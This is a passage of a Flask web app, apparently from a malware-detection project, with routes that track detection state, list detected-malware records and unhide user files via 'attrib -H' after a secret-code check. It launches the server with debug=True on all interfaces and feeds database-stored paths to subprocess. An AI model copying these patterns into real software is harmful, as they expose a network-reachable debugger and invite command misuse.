    return render_template('message1.html',detect_st=detect_st,act=act)

@app.route('/message2', methods=['GET', 'POST'])
def message2():
    msg=""
    detect_st=""
    act=request.args.get("act")
    uname=""
    ky=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)
    print(IP)
    print(mac)

    ff=open("static/detect.txt","r")
    detect_st=ff.read()
    ff.close()
        
    if detect_st=="4":
        ff=open("static/detect.txt","w")
        ff.write("5")
        ff.close()

    mycursor.execute("SELECT count(*) FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
    cc = mycursor.fetchone()[0]

    if cc>0:
        mycursor.execute("SELECT * FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
        data = mycursor.fetchone()
        user=data[5]
        ky=data[12]
        ##Track URL###############
       
  

    '''if act=="1":
        ff=open("static/detect.txt","w")
        ff.write("4")
        ff.close()

    if act=="2":
        ff=open("static/detect.txt","w")
        ff.write("5")
        ff.close()
    if act=="3":
        ff=open("static/detect.txt","w")
        ff.write("1")
        ff.close()'''
        
        

    
    return render_template('message2.html',detect_st=detect_st,act=act)

@app.route('/message3', methods=['GET', 'POST'])
def message3():
    msg=""
    detect_st=""
    act=request.args.get("act")
    uname=""
    ky=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)
    print(IP)
    print(mac)

    ff=open("static/detect.txt","r")
    detect_st=ff.read()
    ff.close()
        
    if detect_st=="5":
        ff=open("static/detect.txt","w")
        ff.write("1")
        ff.close()

    mycursor.execute("SELECT count(*) FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
    cc = mycursor.fetchone()[0]

    if cc>0:
        mycursor.execute("SELECT * FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
        data = mycursor.fetchone()
        user=data[5]
        ky=data[12]
        ##Track URL###############
       
  

    '''if act=="1":
        ff=open("static/detect.txt","w")
        ff.write("4")
        ff.close()

    if act=="2":
        ff=open("static/detect.txt","w")
        ff.write("5")
        ff.close()
    if act=="3":
        ff=open("static/detect.txt","w")
        ff.write("1")
        ff.close()'''
        
        

    
    return render_template('message3.html',detect_st=detect_st,act=act)



@app.route('/alert2', methods=['GET', 'POST'])
def alert2():

    return render_template('alert2.html')
    
@app.route('/predicted', methods=['GET', 'POST'])
def predicted():
    msg=""
    uname=""
    fs=""
    fdata=[]
    st=""
    act=request.args.get("act")
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    

    mycursor.execute("SELECT * FROM register where uname=%s",(uname,))
    data2 = mycursor.fetchone()

    mycursor.execute("SELECT * FROM malware_detected where uname=%s order by id desc",(uname,))
    data3 = mycursor.fetchall()

       
    return render_template('predicted.html',msg=msg,data2=data2,data3=data3)

@app.route('/hash_data', methods=['GET', 'POST'])
def hash_data():
    msg=""
    uname=""
    fs=""
    data3=[]
    data4=[]
    s1=""
    act=request.args.get("act")
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    

    mycursor.execute("SELECT * FROM register where uname=%s",(uname,))
    data2 = mycursor.fetchone()
    ky=data2[12]

    mycursor.execute("SELECT count(*) FROM hash_file where uname=%s order by id",(uname,))
    cnt = mycursor.fetchone()[0]
    if cnt>0:
        s1="1"
        mycursor.execute("SELECT * FROM hash_file where uname=%s && recover_status=0 order by id",(uname,))
        data3 = mycursor.fetchall()

        mycursor.execute("SELECT * FROM hash_file where uname=%s && recover_status=0 order by id",(uname,))
        data4 = mycursor.fetchall()

    if request.method=='POST':
        skey=request.form['secret_code']
        if ky==skey:
            fn=request.form.getlist('c1[]')
            cnt=len(fn)
            for f1 in fn:
                mycursor.execute("SELECT * FROM hash_file where id=%s",(f1,))
                dd = mycursor.fetchone()
                path=dd[2]
                if dd[6]=="dir":
                    subprocess.run(["attrib","-H",dd[7]],check=True)
                else:
                    subprocess.run(["attrib","-H",path],check=True)
                mycursor.execute("update hash_file set recover_status=1 where id=%s",(f1,))
                mydb.commit()
            msg="ok"

        else:
            msg="fail"
            
            

       
    return render_template('hash_data.html',msg=msg,data2=data2,data3=data3,data4=data4,s1=s1)


@app.route('/logout')
def logout():
    # remove the username from the session if it is there
    session.pop('username', None)
    return redirect(url_for('index'))


if __name__ == "__main__":
    app.secret_key = os.urandom(12)
    app.run(debug=True,host='0.0.0.0', port=5000)
